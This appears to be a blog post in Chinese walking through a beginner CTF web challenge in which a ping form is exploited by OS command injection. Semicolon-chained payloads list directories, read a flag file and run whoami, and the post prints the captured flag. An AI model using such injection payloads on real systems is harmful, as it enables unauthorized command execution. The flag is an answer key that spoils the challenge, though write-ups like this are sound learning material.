---
layout: post
title: Web新手题-command_execution
excerpt: "攻防世界新手Web题目-command_execution"
date:   2020-10-10 13:49:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 题目描述“小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。”

2. 输入了几次网址，发现是把post过去的参数*xxxx*拼接成*ping -c 3 xxxx*

3. 通过Chrome扩展Wappalyzer了解到目标为Ubuntu系统

4. 输入*;ls -l*

   ```shell
   ping -c 3 ;ls -l
   total 4
   -rw-rw-r-- 1 root root 925 Sep 27  2018 index.php
   ```

5. 尝试查看php源码，输入*;cat index.php*，并没有返回结果

6. 尝试前往上级目录，输入*;cd ..;ls -l*，成功执行

   ```shell
   ping -c 3 ;cd ..;ls -l
   total 4
   drwxr-xr-x 1 root root 4096 Nov 16  2018 html
   ```

7. 尝试访问几个目录后，在*/home*目录下，找到flag.txt

8. 输入*;cd /home;cat flag.txt*，发现flag：cyberpeace{64275b52a825406ccabfb4eda7bc63da}

   ```shell
   ping -c 3 ;cd /home;cat flag.txt
   cyberpeace{64275b52a825406ccabfb4eda7bc63da}
   ```

9. 提交答案，正确

## 独立思考

### 1. 遇到这种情况，如何提权？

Web服务的执行权限为：

```shell
ping -c 3 ;whoami
www-data
```

**未解决**

## 产生过的疑问

1. 遇到这种情况，如何提权？

